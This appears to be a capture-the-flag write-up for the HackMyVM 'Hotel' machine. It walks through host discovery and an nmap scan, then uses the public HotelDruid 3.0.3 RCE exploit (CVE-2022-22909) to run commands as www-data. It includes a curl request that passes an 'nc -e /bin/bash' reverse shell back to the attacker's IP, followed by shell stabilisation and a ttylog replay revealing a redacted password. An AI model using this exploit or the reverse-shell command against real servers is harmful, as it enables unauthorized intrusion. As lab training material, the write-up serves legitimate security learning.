# Hotel - Owner of Hackmyvm (SML)

# Network Discovery
```bash
┌──(kali💀kali)-[~]
└─$ fping -ag 192.168.1.1/24 2>/dev/null
192.168.1.1
192.168.1.2
192.168.1.102
192.168.1.107
192.168.1.110
192.168.1.106
```
# Nmap 
```shell script
  
┌──(kali💀kali)-[~]
└─$ nmap -A -sC -sV  -p-  192.168.1.110
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 16:00 EDT
Nmap scan report for 192.168.1.110
Host is up (0.00049s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 06:1f:a2:25:19:45:2b:2f:44:cc:74:7a:e2:9b:ab:ac (RSA)
|   256 6f:b9:da:fb:eb:6b:4c:de:33:63:b7:ce:f0:2f:f7:cd (ECDSA)
|_  256 84:fb:1d:5c:4c:c6:60:e8:47:d8:2f:a0:92:8e:fb:18 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title:  Hoteldruid 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Port 80 Discovery
![siteimage](img/site.png)

## Add site hote to /etc/hosts
```bash
┌──(kali💀kali)-[~]
└─$ cat /etc/hosts
127.0.0.1	localhost 
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters
192.168.1.110 hotel.hmv # add this manually  for being more comfortable 
```
```
if u watch site header  , (Hotel Druid appears)
```
# Hotel Druid 3.0.3 - Remote Code Execution (RCE)

```
check this link 
https://www.exploit-db.com/exploits/50754

```

# Use Exploit from exploit-db

```bash
┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/hotels]
└─$ searchsploit -p 50754
  Exploit: Hotel Druid 3.0.3 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50754
     Path: /usr/share/exploitdb/exploits/php/webapps/50754.py
    Codes: CVE-2022-22909
 Verified: False
File Type: Python script, ASCII text executable
                                                                                                                     
┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/hotels]
└─$ cp /usr/share/exploitdb/exploits/php/webapps/50754.py .
                                                                                                                     
┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/hotels]
└─$ python3 50754.py -h                               
usage: 50754.py [-h] -t TARGET [-u USERNAME] [-p PASSWORD] [--noauth]

options:
  -h, --help            show this help message and exit

required arguments:
  -t TARGET, --target TARGET
                        Target URL. Example : http://10.20.30.40/path/to/hoteldruid
  -u USERNAME, --username USERNAME
                        Username
  -p PASSWORD, --password PASSWORD
                        password
  --noauth              If No authentication is required to access the dashboard
```

# Road to Www-data

```bash
┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/hotels]
└─$ python3 50754.py -t http://192.168.1.110 --noauth

 /$$   /$$             /$$               /$$       /$$$$$$$                      /$$       /$$
| $$  | $$            | $$              | $$      | $$__  $$                    |__/      | $$
| $$  | $$  /$$$$$$  /$$$$$$    /$$$$$$ | $$      | $$  \ $$  /$$$$$$  /$$   /$$ /$$  /$$$$$$$
| $$$$$$$$ /$$__  $$|_  $$_/   /$$__  $$| $$      | $$  | $$ /$$__  $$| $$  | $$| $$ /$$__  $$
| $$__  $$| $$  \ $$  | $$    | $$$$$$$$| $$      | $$  | $$| $$  \__/| $$  | $$| $$| $$  | $$
| $$  | $$| $$  | $$  | $$ /$$| $$_____/| $$      | $$  | $$| $$      | $$  | $$| $$| $$  | $$
| $$  | $$|  $$$$$$/  |  $$$$/|  $$$$$$$| $$      | $$$$$$$/| $$      |  $$$$$$/| $$|  $$$$$$$
|__/  |__/ \______/    \___/   \_______/|__/      |_______/ |__/       \______/ |__/ \_______/

Exploit By - 0z09e (https://twitter.com/0z09e)


[*] Trying to access the Dashboard.
[*] Checking the privilege of the user.
[+] User has the privilege to add room.
[*] Adding a new room.
[+] Room has been added successfully.
[*] Testing code exection
[+] Code executed successfully, Go to http://192.168.1.110/dati/selectappartamenti.php and execute the code with the parameter 'cmd'.
[+] Example : http://192.168.1.110/dati/selectappartamenti.php?cmd=id
[+] Example Output : uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
This is our RCE command that we can get a reverse shell  :

curl http://192.168.1.110/dati/selectappartamenti.php?cmd=nc+-e+/bin/bash+192.168.1.107+1234

```
![wwwdata](img/www-data.png)

# Extend the priv 
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@dhcppc10:~/html/hoteldruid/dati$ export TERM=xterm
export TERM=xterm
#now press CTRL-Z
stty raw -echo;fg 
                    reset
```

# Ttylog file
```bash
www-data@dhcppc10:~/html$ ttyplay < ttylog 
person@hotel:~$ my passw0rd is XXXXXXXXXXXX enjoy
```